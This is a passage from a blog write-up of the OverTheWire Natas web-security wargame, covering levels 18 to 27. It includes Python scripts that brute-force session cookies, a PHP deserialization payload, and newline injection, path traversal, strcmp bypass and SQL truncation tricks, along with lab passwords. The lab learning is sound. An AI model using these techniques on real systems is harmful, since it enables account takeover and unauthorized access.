+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sh">'</span><span class="s">http://natas18.natas.labs.overthewire.org/index.php</span><span class="sh">'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="sh">'</span><span class="s">regular user</span><span class="sh">'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+        <span class="nf">exit</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h3 id="natas-19">[Natas 19]</h3>
+<p><code class="language-plaintext highlighter-rouge">http://natas19.natas.labs.overthewire.org</code> <br />
+The trick is the same as the last challenge, but this time we can’t take a look at the code and the session ID isn’t just a number anymore. <br />
+After inspecting a few requests with burp, it seems that the new id has the following structure: number-givenUsername. <br />
+This can be seen by taking the cookie value and decoding it as ASCII hex. <br />
+Assuming that the numbers are still up to 640, we want to try all of them with the admin username. The trickier part is to tell python to encode everything in hex.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">codecs</span>
+
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="sh">'</span><span class="s">Content-Type</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">application/x-www-form-urlencoded</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">Authorization</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==</span><span class="sh">'</span><span class="p">,</span>
+    <span class="p">}</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="sh">'</span><span class="s">username=admin&amp;password=xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP</span><span class="sh">'</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">641</span><span class="p">):</span>
+    <span class="n">session</span> <span class="o">=</span> <span class="n">codecs</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="nf">bytes</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="sh">'</span><span class="s">-admin</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">),</span><span class="sh">'</span><span class="s">hex</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="sh">'</span><span class="s">PHPSESSID</span><span class="sh">'</span><span class="p">:</span> <span class="n">session</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">"</span><span class="s">utf-8</span><span class="sh">"</span><span class="p">)</span>
+    <span class="p">}</span>
+
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sh">'</span><span class="s">http://natas19.natas.labs.overthewire.org/index.php</span><span class="sh">'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="sh">'</span><span class="s">regular</span><span class="sh">'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+        <span class="nf">exit</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h3 id="natas-20">[Natas 20]</h3>
+<p><code class="language-plaintext highlighter-rouge">http://natas20.natas.labs.overthewire.org</code> <br />
+This challenge was tricky to understand, because it mixes the concept of PHP sessions and of serialization. <br />
+What happens is that the read and write methods are invoked automagically to handle the sessions, binding usernames to session ids. <br />
+In particular, the name and id are stored as a ‘key value’ pair, one per line, and read from there to get the id which will be checked against the admin. We know that we need username ‘admin’ to have id ‘1’ to get authorized. We can actually inject that as a new line when asking for the new name. <br />
+First, we need to intercept the request with Burp, and to change the value of the name paramenter to <code class="language-plaintext highlighter-rouge">%0Aadmin%201</code>. This is the URL encoding of <code class="language-plaintext highlighter-rouge">\nadmin 1</code>. <br />
+With this request we write ‘admin 1’ as a new line in the session file. We can then go back to the website and issue a new request for the name ‘admin’, and given that we are in the list, we will get the flag back.</p>
+
+<h3 id="natas-21">[Natas 21]</h3>
+<p><code class="language-plaintext highlighter-rouge">http://natas21.natas.labs.overthewire.org</code> <br />
+The website being in colocation means that there will be some resources shared between our target website and the other one that we are provided with, because the concept of colocation is hosting multiple websites on a single server. <br />
+From the source code we see that the only thing checked for authorization is that the ‘admin’ key has value ‘1’. And this is a value that we can add from the colocated page: intercepting an update request with Burp we just have to add the field in the POST body. <br />
+Make sure to use the session ID from a previous intercepted request coming from the main page. After submitting the POST, refreshing the main page should be enough to be authorized to see the flag.</p>
+
+<h3 id="natas-22">[Natas 22]</h3>
+<p><code class="language-plaintext highlighter-rouge">http://natas22.natas.labs.overthewire.org</code> <br />
+After reading the source code, the only trick to understand is that there is a quick redirect happening. Burp comes in handy to capture what is loaded before the redirect. <br />
+In the source code it’s clear that the password can be seen by adding the <code class="language-plaintext highlighter-rouge">revelio</code> parameter to the get request. <br />
+This is the URL that we need to visit: <code class="language-plaintext highlighter-rouge">http://natas22.natas.labs.overthewire.org/?revelio</code>. <br />
+Make sure to have Burp running, and switch to it to see the flag in the revelio page, that will be logged just before the redirect.</p>
+
+<h3 id="natas-23">[Natas 23]</h3>
+<p><code class="language-plaintext highlighter-rouge">http://natas23.natas.labs.overthewire.org</code> <br />
+The password has to satisfy two conditions: contain ‘iloveyou’ and start with a number larger than 10. <br />
+The <code class="language-plaintext highlighter-rouge">strstr</code> method is basically looking for the index of the given substring. The integer comparison implies a cast from string to int, and it works as follows (from the PHP manual):</p>
+<blockquote>
+  <p>when a string is evaluated in a numeric context, the string is interpreted as a float if it contains any of the characters ‘.’, ‘e’, or ‘E’. 
+Otherwise, it will be evaluated as an integer. 
+The value is given by the initial portion of the string: if it starts with valid numeric data, this will be the value used. Otherwise, the value will be 0 (zero).
+Our password can therefore be something like ‘15iloveyou’.</p>
+</blockquote>
+
+<h3 id="natas-24">[Natas 24]</h3>
+<p><code class="language-plaintext highlighter-rouge">http://natas24.natas.labs.overthewire.org</code> <br />
+This time the password is checked using <code class="language-plaintext highlighter-rouge">strcmp</code>. This method returns &lt; 0 if str1 is less than str2; &gt; 0 if str1 is greater than str2, and 0 if they are equal. The interesting part is that apparently it returns 0 also if the comparison generates an error! <br />
+This means that our password has to be a value that will break the comparison, for example an array: we intercept the password request with Burp, and modify <code class="language-plaintext highlighter-rouge">/?passwd=a</code> to <code class="language-plaintext highlighter-rouge">/?passwd[]=a</code>. <br />
+Trying to <code class="language-plaintext highlighter-rouge">strcmp</code> an array with a string will cause an error and we will get the flag.</p>
+
+<h3 id="natas-25">[Natas 25]</h3>
+<p><code class="language-plaintext highlighter-rouge">http://natas25.natas.labs.overthewire.org</code> <br />
+This challenge requires some path traversal and injecting into a file. <br />
+Our target is the log file, from which we know the path: we have to move up a few folders until the root, and then go into <code class="language-plaintext highlighter-rouge">/logs</code>. For the name of the file itself we grap the session ID by intercepting a request with Burp. <br />
+There is a protection for path traversal in place, which just substitutes <code class="language-plaintext highlighter-rouge">../</code>. What we do is adding characters to our ``../<code class="language-plaintext highlighter-rouge">, so that it will be in the right form after the sanitization: </code>../<code class="language-plaintext highlighter-rouge"> becomes </code>…/…//<code class="language-plaintext highlighter-rouge">. \
+We know that the UserAgent in the HTTP header request will be stored in the log file without sanitization: this means that we can access the password file from there, and then have it printed in the log. \
+We intercept a request with Burp and modify it as follows: </code>GET: /?lang=…/…//logs/natas25_pl5gojum2i30fpacidq0h950q6.log HTTP/1.1`</p>
+
+<h3 id="natas-26">[Natas 26]</h3>
+<p><code class="language-plaintext highlighter-rouge">http://natas26.natas.labs.overthewire.org</code> \</p>
+
+<p>Thanks to n0j for the <a href="https://n0j.github.io/2017/07/19/otw-natas-26.html">writeup</a>, that helped a lot!\</p>
+
+<p>There are three interesting things in this challenge: there is serialization ongoing, there is a logging class that has the methods used after serialization, and we have access to the serialized data stored in the cookie. <br />
+Although the cookie is expected to contain only the data for the drawings, upon deserialization whatever is contained in the cookie will be run through the constructors and destructors methods. So we can create a logger object so that on destruction our target file will be dumped into something that we can access. The following code is from n0j’s page:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="kd">class</span> <span class="nc">Logger</span> <span class="p">{</span>
+    <span class="k">private</span> <span class="nv">$logFile</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$initMsg</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$exitMsg</span><span class="p">;</span>
+    
+    <span class="k">function</span> <span class="n">__construct</span><span class="p">(){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">initMsg</span><span class="o">=</span><span class="s2">"blabla</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">exitMsg</span><span class="o">=</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">logFile</span> <span class="o">=</span> <span class="s2">"/var/www/natas/natas26/img/pwd.php"</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Logger</span><span class="p">();</span>
+<span class="k">print</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span><span class="mf">.</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>This gives us the content of the cookie. We now have to intercept a request, change the cookie with our own content (make sure special characters are URL encoded), forward it and then visit our target page ‘img/pwd.php’</p>
+
+<h3 id="natas-27">[Natas 27]</h3>
+<p><code class="language-plaintext highlighter-rouge">http://natas27.natas.labs.overthewire.org</code> <br />
+Thanks again to n0j for the <a href="https://n0j.github.io/2017/07/20/otw-natas-27.html">SQL insights</a>.</p>
+
+<p>The main thing to realize in this challenge is that there is no requirements for the usernames in the database to be unique. What gives it away is that the dumpData method uses a loop, instead of just printing what should be a single object. <br />
+The problem is, how do we register a second natas28 user? As n0j discovered, when trying to create a username longer than the allowed varchar64, the trailing part is just chopped. Even more interestingly, whitespaces are stored but are not considered when doing a SELECT query over the usernames. <br />
+Therefore, registering a user with name <code class="language-plaintext highlighter-rouge">natas28 1</code> with empty password will succeed, and upon login with <code class="language-plaintext highlighter-rouge">natas28</code> and empty password we will be allowed in and showed the data of the first existing natas28 with the proper flag.</p>
+
+<h3 id="natas-28">[Natas 28]</h3>
+<h3 id="natas-29">[Natas 29]</h3>
+<h3 id="natas-30">[Natas 30]</h3>
+<h3 id="natas-31">[Natas 31]</h3>
+<h3 id="natas-32">[Natas 32]</h3>
+<h3 id="natas-33">[Natas 33]</h3>
+<h3 id="natas-34">[Natas 34]</h3>
+<h3 id="natas-34-1">[Natas 34]</h3>
+<p>…Crypto? And then probably Perl? And then who knows what? No idea, really no clue. Sadly the ride along Natas stops here for me.</p>
+
+        </div>
+
+        
+          <div class="page-share">
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fctf%2F2023%2F11%2F03%2FNatas.html" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" class="btn btn--facebook btn--small"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i> <span>Share</span></a>
+  <a href="https://twitter.com/intent/tweet?text=Natas+CTF%20http%3A%2F%2Flocalhost%3A4000%2Fctf%2F2023%2F11%2F03%2FNatas.html" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" class="btn btn--twitter btn--small"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i> <span>Tweet</span></a>
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fctf%2F2023%2F11%2F03%2FNatas.html" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" class="btn btn--linkedin btn--small"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> <span>LinkedIn</span></a>
+  <a href="https://reddit.com/submit?title=Natas+CTF&url=http%3A%2F%2Flocalhost%3A4000%2Fctf%2F2023%2F11%2F03%2FNatas.html" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" class="btn btn--reddit btn--small"><i class="fab fa-fw fa-reddit" aria-hidden="true"></i> <span>Reddit</span></a>
+</div>
+
+        
+
+        
+
+        <nav class="page-pagination" role="navigation">
+  
+    <a class="page-previous" href="/ctf/2023/11/03/Narnia.html">
+      <h4 class="page-pagination-label">Previous</h4>
+      <span class="page-pagination-title">
+        <i class="fas fa-arrow-left"></i> Narnia CTF
+
+      </span>
+    </a>
+  
+
+  
+    <a class="page-next" href="/ctf/2023/11/04/Binary-Bomb.html">
+      <h4 class="page-pagination-label">Next</h4>
+      <span class="page-pagination-title">
+        Binary Bomb
+ <i class="fas fa-arrow-right"></i>
+      </span>
+    </a>
+  
+</nav>
+
+      </div>
+    </div>
+  </article>
+</main>
+
+
+    <footer id="footer" class="site-footer">
+  <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+<div class="social-icons"><a class="social-icon" href="/atom.xml"><i class="fas fa-rss-square fa-2x" title="Feed"></i></a></div><div class="copyright">
+    
+      <p>&copy; 2024 Cloud Castle Chaos. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://github.com/mmistakes/so-simple-theme" rel="nofollow">So Simple</a>.</p>
+    
+  </div>
+</footer>
+
+    <script src="https://code.jquery.com/jquery-3.3.1.min.js" integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous"></script>
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://use.fontawesome.com/releases/v5.0.12/js/all.js"></script>
+
+
+<!-- MathJax -->
+
+<script>
+// http://docs.mathjax.org/en/latest/upgrading/v2.html
+MathJax = {
+  tex: {
+      tags: "ams"    // eq numbering options: none, ams, all
+  },
+  options: {
+    renderActions: {
+      // for mathjax 3, handle <script "math/tex"> blocks inserted by kramdown
+      find: [10, function (doc) {
+        for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+          const display = !!node.type.match(/; *mode=display/);
+          const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+          const text = document.createTextNode('');
+          node.parentNode.replaceChild(text, node);
+          math.start = {node: text, delim: '', n: 0};
+          math.end = {node: text, delim: '', n: 0};
+          doc.math.push(math);
+        }
+      }, '']
+    }
+  }
+}
+</script>
+
+<script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js"></script>
+
+  </body>
+
+</html>
